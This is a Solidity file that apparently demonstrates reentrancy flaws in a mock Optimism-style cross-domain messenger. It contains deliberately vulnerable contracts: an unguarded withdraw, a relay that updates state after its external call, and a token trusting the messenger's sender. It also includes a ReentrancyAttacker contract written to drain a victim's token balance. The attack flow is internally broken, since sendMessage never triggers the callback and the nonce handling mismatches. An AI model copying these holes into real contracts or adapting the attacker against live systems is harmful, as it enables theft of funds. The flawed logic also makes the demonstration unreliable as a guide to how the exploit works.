// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

/**
 * @title OptimismPortalMock
 * @notice Mock implementation of OptimismPortal for demonstrating reentrancy vulnerabilities
 */
contract OptimismPortalMock {
    event DepositTransaction(address indexed to, uint256 value, uint32 gasLimit, bool isCreation, bytes data);
    
    function depositTransaction(
        address _to,
        uint256 _value,
        uint32 _gasLimit,
        bool _isCreation,
        bytes memory _data
    ) external {
        emit DepositTransaction(_to, _value, _gasLimit, _isCreation, _data);
    }
}

/**
 * @title CrossL2Inbox
 * @notice Base contract for cross-layer messaging with shared functionality
 */
contract CrossL2Inbox {
    mapping(bytes32 => bool) public initiatedMessages;
    
    event MessageInitiated(bytes32 indexed messageHash, address sender, address target);
    
    function verifyMessage(
        address _sender,
        address _target,
        bytes calldata _message,
        uint256 _nonce
    ) internal view returns (bool) {
        bytes32 messageHash = keccak256(
            abi.encodePacked(_sender, _target, _message, _nonce)
        );
        return initiatedMessages[messageHash];
    }
    
    // VULNERABLE: Missing proper validation in dispute resolution
    function resolveDispute(bytes32 _messageHash) public {
        require(!initiatedMessages[_messageHash], "Dispute already resolved");
        initiatedMessages[_messageHash] = true;
        // Dispute resolution logic...
    }
    
    // VULNERABLE: No access control or reentrancy guard
    function withdraw(address _to, uint256 _amount) external {
        // Direct theft vulnerability
        payable(_to).transfer(_amount);
    }
}

/**
 * @title VulnerableL1CrossDomainMessenger
 * @notice Simplified version of cross-domain messenger with reentrancy vulnerability
 */
contract VulnerableL1CrossDomainMessenger {
    address public immutable PORTAL;
    mapping(bytes32 => bool) public relayedMessages;
    mapping(bytes32 => bool) public successfulMessages;
    uint256 public messageNonce;
    
    address internal xDomainMsgSender;
    bool internal executing;
    
    event SentMessage(address indexed target, address sender, bytes message, uint256 messageNonce);
    event RelayedMessage(bytes32 indexed msgHash);
    
    constructor(address _portal) {
        PORTAL = _portal;
    }
    
    function xDomainMessageSender() public view returns (address) {
        require(executing, "Not executing a cross-domain message");
        return xDomainMsgSender;
    }
    
    // VULNERABLE: Missing reentrancy guard allows nested calls
    function sendMessage(address _target, bytes memory _message, uint32 _gasLimit) public {
        bytes32 messageHash = keccak256(abi.encode(
            messageNonce,
            msg.sender,
            _target,
            _message,
            _gasLimit
        ));
        
        messageNonce++; // Increment messageNonce AFTER use
        
        emit SentMessage(_target, msg.sender, _message, messageNonce);
        
        // Call to OptimismPortal which could allow reentrancy
        IOptimismPortal(PORTAL).depositTransaction(_target, 0, _gasLimit, false, _message);
    }
    
    // VULNERABLE: Doesn't follow checks-effects-interactions pattern
    function relayMessage(
        address _target,
        address _sender,
        bytes memory _message,
        uint256 _messageNonce
    ) public returns (bool) {
        bytes32 messageHash = keccak256(abi.encode(
            _messageNonce,
            _sender,
            _target,
            _message,
            0 // Gas limit, not used in hash computation
        ));
        
        // Prevent replaying the same message
        require(!relayedMessages[messageHash], "Message already relayed");
        
        xDomainMsgSender = _sender;
        executing = true;
        
        // External call before updating relayedMessages state
        (bool success, ) = _target.call(_message);
        
        // Update state after external call (VULNERABILITY)
        relayedMessages[messageHash] = true;
        successfulMessages[messageHash] = success;
        
        executing = false;
        xDomainMsgSender = address(0);
        
        emit RelayedMessage(messageHash);
        
        return success;
    }
}

/**
 * @title VulnerableToken
 * @notice Sample token contract vulnerable to reentrancy via the L1CrossDomainMessenger
 */
contract VulnerableToken {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;
    
    address public messenger;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(address _messenger) {
        messenger = _messenger;
    }
    
    function mint(address _to, uint256 _amount) external {
        balances[_to] += _amount;
        emit Transfer(address(0), _to, _amount);
    }
    
    function balanceOf(address _account) external view returns (uint256) {
        return balances[_account];
    }
    
    function approve(address _spender, uint256 _amount) external returns (bool) {
        allowances[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }
    
    // VULNERABLE: Trusts xDomainMessageSender without proper checks
    function transferFrom(address _from, address _to, uint256 _amount) external returns (bool) {
        address spender = msg.sender;
        
        // If this is called via the messenger, use the L1 sender as the spender
        if (msg.sender == messenger) {
            try VulnerableL1CrossDomainMessenger(messenger).xDomainMessageSender() returns (address l1Sender) {
                spender = l1Sender;
            } catch {
                revert("Not called via messenger");
            }
        }
        
        // VULNERABLE: The regular allowance check can be bypassed during reentrancy
        // because it uses the xDomainMessageSender which doesn't change during
        // a nested call in the vulnerable messenger
        if (spender != _from) {
            uint256 allowed = allowances[_from][spender];
            if (allowed != type(uint256).max) {
                require(allowed >= _amount, "Insufficient allowance");
                allowances[_from][spender] = allowed - _amount;
            }
        }
        
        require(balances[_from] >= _amount, "Insufficient balance");
        balances[_from] -= _amount;
        balances[_to] += _amount;
        
        emit Transfer(_from, _to, _amount);
        return true;
    }
}

/**
 * @title ReentrancyAttacker
 * @notice Contract that exploits the reentrancy vulnerability in the L1CrossDomainMessenger
 */
contract ReentrancyAttacker {
    address public messenger;
    address public token;
    address public owner;
    bool public attackInProgress;
    uint256 public messageNonce;
    
    event AttackComplete(uint256 stolenAmount);
    
    constructor(address _messenger, address _token) {
        messenger = _messenger;
        token = _token;
        owner = msg.sender;
    }
    
    // Step 1: Start the attack
    function executeAttack() external {
        require(msg.sender == owner, "Only owner can execute attack");
        attackInProgress = true;
        
        // Create a message that will be relayed to trigger the attack
        bytes memory firstMessage = abi.encodeWithSignature("receiveFirstMessage()");
        
        // Send the first message through the cross-domain messenger
        VulnerableL1CrossDomainMessenger(messenger).sendMessage(address(this), firstMessage, 1000000);
    }
    
    // Step 2: First message callback - this is called by the messenger during relayMessage
    function receiveFirstMessage() external {
        // Verify the call is from the messenger
        require(msg.sender == messenger, "Not called from messenger");
        require(VulnerableL1CrossDomainMessenger(messenger).xDomainMessageSender() == owner, "Invalid sender");
        
        // Create second message to exploit the reentrancy
        bytes memory reentrancyMessage = abi.encodeWithSignature("performReentrancy()");
        
        // This will call back into the messenger before the first relayMessage completes
        VulnerableL1CrossDomainMessenger(messenger).sendMessage(address(this), reentrancyMessage, 1000000);
        
        // Force the relayMessage to happen immediately (in a real scenario, this 
        // would be timed with the L1->L2 message processing)
        VulnerableL1CrossDomainMessenger(messenger).relayMessage(
            address(this),
            owner,
            reentrancyMessage,
            messageNonce++
        );
    }
    
    // Step 3: Called through reentrancy - steal tokens while first message is still processing
    function performReentrancy() external {
        require(msg.sender == messenger, "Not called from messenger");
        require(VulnerableL1CrossDomainMessenger(messenger).xDomainMessageSender() == owner, "Invalid sender");
        
        // Target address from which to steal tokens - in test this would be setup with balances
        address victim = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8; // hardhat's first test account
        
        // Check victim's token balance
        uint256 victimBalance = VulnerableToken(token).balanceOf(victim);
        
        // Steal tokens - this works because the token contract checks permissions via the messenger,
        // but due to reentrancy the messenger's state is corrupted
        VulnerableToken(token).transferFrom(victim, address(this), victimBalance);
        
        emit AttackComplete(victimBalance);
        attackInProgress = false;
    }
    
    // To receive ETH
    receive() external payable {}
}

/**
 * @title FaultDisputeGame
 * @notice Smart contract to simulate Optimism's dispute game vulnerability
 */
contract FaultDisputeGame {
    uint256 public constant MAX_GAME_DEPTH = 10;

    function step(uint256 _gameDepth) external {
        require(_gameDepth < MAX_GAME_DEPTH, "Invalid game depth");
        // Vulnerability: No checks at MAX_GAME_DEPTH or MAX_GAME_DEPTH-2
    }

    function attack(uint256 _gameDepth) external {
        require(_gameDepth < MAX_GAME_DEPTH, "Invalid attack depth");
        // Vulnerability: No checks at MAX_GAME_DEPTH-2
    }

    function defend(uint256 _gameDepth) external {
        require(_gameDepth < MAX_GAME_DEPTH, "Invalid defend depth");
        // Vulnerability: No checks at MAX_GAME_DEPTH-2
    }
}

interface IOptimismPortal {
    function depositTransaction(address, uint256, uint32, bool, bytes memory) external;
}
